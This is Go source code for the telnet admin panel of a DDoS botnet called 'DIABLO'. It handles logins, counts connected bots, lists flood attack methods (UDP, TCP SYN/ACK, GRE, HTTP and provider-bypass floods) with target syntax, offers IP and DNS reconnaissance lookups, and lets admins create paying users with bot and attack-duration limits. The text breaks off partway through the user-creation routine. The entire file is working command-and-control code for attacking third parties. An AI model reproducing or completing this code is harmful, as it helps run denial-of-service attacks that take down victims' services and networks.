package main

import (
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"strconv"
	"strings"
	"time"
)

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

func (this *Admin) Handle() {
	this.conn.Write([]byte("\033[?1049h"))
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
	}()

	// Get username

	this.conn.Write([]byte("\x1b[1;93m[\x1b[1;97mUsername\x1b[1;93m]\x1b[1;97m: \x1b[1;93m"))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}

	// Get password
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\x1b[1;93m[\x1b[1;97mPassword\x1b[1;93m]\x1b[1;97m: \x1b[1;93m"))
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}

	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
	this.conn.Write([]byte("\r\n"))

	var loggedIn bool
	var userInfo AccountInfo
	if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
		this.conn.Write([]byte("\x1b[1;97mInvalid \x1b[1;93mCredentials\x1b[1;97m. Connection Logged!\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}

	this.conn.Write([]byte("\r\n\033[0m"))
	go func() {
		i := 0
		for {
			var BotCount int
			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
				BotCount = userInfo.maxBots
			} else {
				BotCount = clientList.Count()
			}

			time.Sleep(time.Second)
			if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; DIABLO  |  DEMONS: %d  |  Connected As --> %s \007", BotCount, username))); err != nil {
				this.conn.Close()
				break
			}
			i++
			if i%60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;93m                             Welcome To \x1b[1;97mÐΙΛΒLΘ    \r\n"))
	this.conn.Write([]byte("\x1b[1;93m                Type \x1b[1;97m? \x1b[1;93mFor A List Of Available Commands    \r\n"))

	for {
		var botCatagory string
		var botCount int
		this.conn.Write([]byte("\x1b[1;93m[\x1b[1;97m" + username + "\x1b[1;93m •\x1b[1;97m ÐΙΛΒLΘ\x1b[1;93m]\x1b[1;97m: \x1b[1;93m"))
		cmd, err := this.ReadLine(false)
		if err != nil || cmd == "exit" || cmd == "quit" || cmd == "LOGOUT" || cmd == "logout" {
			return
		}
		if cmd == "" {
			continue
		}
		if err != nil || cmd == "CLEAR" || cmd == "clear" || cmd == "cls" || cmd == "CLS" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[1;93m                                                                \r\n"))
			this.conn.Write([]byte("\x1b[1;93m                 ▓█████▄  ██▓ ▄▄▄       ▄▄▄▄    ██▓     ▒█████  \r\n"))
			this.conn.Write([]byte("\x1b[1;93m                 ▒██▀ ██▌▓██▒▒████▄    ▓█████▄ ▓██▒    ▒██▒  ██▒\r\n"))
			this.conn.Write([]byte("\x1b[1;93m                 ░██   █▌▒██▒▒██  ▀█▄  ▒██▒ ▄██▒██░    ▒██░  ██▒\r\n"))
			this.conn.Write([]byte("\x1b[1;93m                 ░▓█▄   ▌░██░░██▄▄▄▄██ ▒██░█▀  ▒██░    ▒██   ██░\r\n"))
			this.conn.Write([]byte("\x1b[1;93m                 ░▒████▓ ░██░ ▓█   ▓██▒░▓█  ▀█▓░██████▒░ ████▓▒░\r\n"))
			this.conn.Write([]byte("\x1b[1;93m                  ▒▒▓  ▒ ░▓   ▒▒   ▓▒█░░▒▓███▀▒░ ▒░▓  ░░ ▒░▒░▒░ \r\n"))
			this.conn.Write([]byte("\x1b[1;93m                  ░ ▒  ▒  ▒ ░  ▒   ▒▒ ░▒░▒   ░ ░ ░ ▒  ░  ░ ▒ ▒░ \r\n"))
			this.conn.Write([]byte("\x1b[1;93m                  ░ ░  ░  ▒ ░  ░   ▒    ░    ░   ░ ░   ░ ░ ░ ▒  \r\n"))
			this.conn.Write([]byte("\x1b[1;93m                    ░     ░        ░  ░ ░          ░  ░    ░ ░  \r\n"))
			this.conn.Write([]byte("\x1b[1;93m                                                                \r\n"))
			this.conn.Write([]byte("\x1b[1;93m                   Type \x1b[1;97m? \x1b[1;93mFor A List Of Available \x1b[1;97mCommands\r\n"))
			this.conn.Write([]byte("\x1b[1;93m\r\n"))

			continue
		}

		if err != nil || cmd == "HELP" || cmd == "help" || cmd == "?" {

			this.conn.Write([]byte("\x1b[1;33m╔═                                          \x1b[1;33m═╗\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;97mATTACKS  \x1b[90m- \x1b[0mShows A List Of Ddos Attacks   \x1b[1;33m║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;97mRULES    \x1b[90m- \x1b[0mShows A List Of Rules          \x1b[1;33m║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;97mCLEAR    \x1b[90m- \x1b[0mClears Screen                  \x1b[1;33m║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;97mINFO     \x1b[90m- \x1b[0mShows User Info                \x1b[1;33m║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;97mTOOLS    \x1b[90m- \x1b[0mDisplay list of tools          \x1b[1;33m║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;97mADMIN    \x1b[90m- \x1b[0mShows Admin Only Commands      \x1b[1;33m║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m╚═                                          \x1b[1;33m═╝\r\n"))
			continue
		}

		if err != nil || cmd == "ADMIN" || cmd == "admin" {

			this.conn.Write([]byte("\x1b[1;33m╔═                                     \x1b[1;33m═╗\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mADDREG      \x1b[90m- \x1b[0mCreate A Regular User  \x1b[1;33m║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mADDADMIN    \x1b[90m- \x1b[0mCreate A Admin User    \x1b[1;33m║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mREMOVEUSER  \x1b[90m- \x1b[0mRemove A User          \x1b[1;33m║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m╚═                                     \x1b[1;33m═╝\r\n"))

			continue

		}

		if err != nil || cmd == "ATTACKS" || cmd == "attacks" {

			this.conn.Write([]byte("\x1b[1;33m╔═                            \x1b[1;33m═╗\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mUDP  \x1b[90m- \x1b[0mUDP type attacks     \x1b[1;33m║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mTCP  \x1b[90m- \x1b[0mTCP type attacks     \x1b[1;33m║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mGRE  \x1b[90m- \x1b[0mGRE type attacks     \x1b[1;33m║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mSPC  \x1b[90m- \x1b[0mSPECIAL type attacks \x1b[1;33m║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m╚═                            \x1b[1;33m═╝\r\n"))
			continue

		}
		if err != nil || cmd == "RULES" || cmd == "rules" {

			this.conn.Write([]byte("\x1b[1;33m╔═                                \x1b[1;33m═╗\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║ \x1b[1;37m1.\x1b[90m No Spam Hitting              \x1b[1;33m║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║ \x1b[1;37m2.\x1b[90m No Sharing Logins            \x1b[1;33m║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║ \x1b[1;37m3.\x1b[90m No Hitting The Net           \x1b[1;33m║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║ \x1b[1;37m4.\x1b[90m No Hitting Government Sites  \x1b[1;33m║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m╚═                                \x1b[1;33m═╝\r\n"))
			continue
		}
		if err != nil || cmd == "info" || cmd == "INFO" || cmd == "I" || cmd == "i" {
			var BotCount int
			BotCount = clientList.Count()
			this.conn.Write([]byte("\x1b[1;33m╔═                        \x1b[1;33m═╗\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;33m║  \x1b[1;37mUser: \x1b[1;93m%s            \x1b[1;33m║\r\n", username)))
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;33m║  \x1b[1;37mBots: \x1b[1;93m%d                 \x1b[1;33m║\r\n", BotCount)))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mVersion: \x1b[1;93mv1.0           \x1b[1;33m║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m╚═                        \x1b[1;33m═╝\r\n"))

			continue
		}
		if err != nil || cmd == "udp" || cmd == "UDP" {

			this.conn.Write([]byte("\x1b[1;33m╔═                                ═╗\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mUDP   \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mPLAIN \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mSTD   \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mDNS   \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mVSE   \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m╚═                                ═╝\r\n"))
			continue
		}
		if err != nil || cmd == "tcp" || cmd == "TCP" {

			this.conn.Write([]byte("\x1b[1;33m╔═                                 ═╗\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mTCPALL \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mSTOMP  \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mUSYN   \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mASYN   \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mFRAG   \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mXMAS   \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mACK    \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m╚═                                 ═╝\r\n"))
			continue
		}
		if err != nil || cmd == "GRE" || cmd == "gre" {

			this.conn.Write([]byte("\x1b[1;33m╔═                                 ═╗\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mGREETH \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mGREIP  \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m╚═                                 ═╝\r\n"))
			continue
		}
		if err != nil || cmd == "SPC" || cmd == "spc" {

			this.conn.Write([]byte("\x1b[1;33m╔═                                 ═╗\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mOVH-V2 \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mNFO    \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mAWE    \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mCIA    \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mICE    \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mPACK   \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mSHOCK  \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mRUSE   \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mHTVAC  \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mSTLE   \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mHTTP   \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m╚═                                 ═╝\r\n"))
			continue
		}
		if err != nil || cmd == "TOOLS" || cmd == "tools" {
			this.conn.Write([]byte("\x1b[1;33m╔═                              ═╗\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║\x1b[1;37m PING      - \x1b[1;36mPings an IP        \x1b[1;33m║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║\x1b[1;37m IPLOOKUP  - \x1b[1;36mShows IP info      \x1b[1;33m║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║\x1b[1;37m WHOIS     - \x1b[1;36mRuns a WHOIS check \x1b[1;33m║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║\x1b[1;37m TRACER    - \x1b[1;36mTraceroute on IP   \x1b[1;33m║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║\x1b[1;37m RESOLVE   - \x1b[1;36mResolves Domain    \x1b[1;33m║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║\x1b[1;37m REVDNS    - \x1b[1;36mShows DNS of IP    \x1b[1;33m║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║\x1b[1;37m ASNLOOKUP - \x1b[1;36mShows ASN of IP    \x1b[1;33m║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║\x1b[1;37m SUBCALC   - \x1b[1;36mCalculates Subnet  \x1b[1;33m║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m║\x1b[1;37m ZTRANSF   - \x1b[1;36mShows ZoneTransfer \x1b[1;33m║\r\n"))
			this.conn.Write([]byte("\x1b[1;33m╚═                              ═╝\r\n"))
			continue
		}

		if err != nil || cmd == "IPLOOKUP" || cmd == "iplookup" {
			this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m:\x1b[97m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "http://ip-api.com/line/" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[96mResponse\x1b[96m: \r\n\x1b[96m" + locformatted + "\r\n"))
		}

		if err != nil || cmd == "WHOIS" || cmd == "whois" {
			this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/whois/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[96mResponse\x1b[96m: \r\n\x1b[96m" + locformatted + "\r\n"))
		}

		if err != nil || cmd == "PING" || cmd == "ping" {
			this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/nping/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 60 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
		}

		if err != nil || cmd == "tracer" || cmd == "TRACER" {
			this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/mtr/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 60 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 60 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[96mError IP address or host name only\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
		}

		if err != nil || cmd == "resolve" || cmd == "RESOLVE" {
			this.conn.Write([]byte("\x1b[96mWebsite (Without www.)\x1b[97m: \x1b[97m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/hostsearch/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 15 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
		}

		if err != nil || cmd == "revdns" || cmd == "REVDNS" {
			this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/reverseiplookup/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
		}

		if err != nil || cmd == "asnlookup" || cmd == "asnlookup" {
			this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/aslookup/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 15 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
		}

		if err != nil || cmd == "subcalc" || cmd == "SUBCALC" {
			this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/subnetcalc/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
		}

		if err != nil || cmd == "ztransf" || cmd == "ZTRANSF" {
			this.conn.Write([]byte("\x1b[96mIP Address Or Website (Without www.)\x1b[0m: \x1b[96m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/zonetransfer/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 15 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
		}

		botCount = userInfo.maxBots

		if userInfo.admin == 1 && cmd == "ADDREG" {
			this.conn.Write([]byte("\x1b[1;33mUsername:\x1b[0m "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\x1b[1;33mPassword:\x1b[0m "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\x1b[1;33mBotcount (-1 for All):\x1b[0m "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the Bot Count")))
				continue
			}
			this.conn.Write([]byte("\x1b[1;33mAttack Duration (-1 for Unlimited):\x1b[0m "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the Attack Duration Limit")))
				continue
			}
			this.conn.Write([]byte("\x1b[1;33mCooldown (0 for No Cooldown):\x1b[0m "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse Cooldown")))
				continue
			}
			this.conn.Write([]byte("\x1b[1;93m- New User Info - \r\n- Username - \x1b[1;93m" + new_un + "\r\n\033[0m- Password - \x1b[1;93m" + new_pw + "\r\n\033[0m- Bots - \x1b[1;93m" + max_bots_str + "\r\n\033[0m- Max Duration - \x1b[1;93m" + duration_str + "\r\n\033[0m- Cooldown - \x1b[1;93m" + cooldown_str + "   \r\n\x1b[1;33mContinue? (y/n):\x1b[0m "))
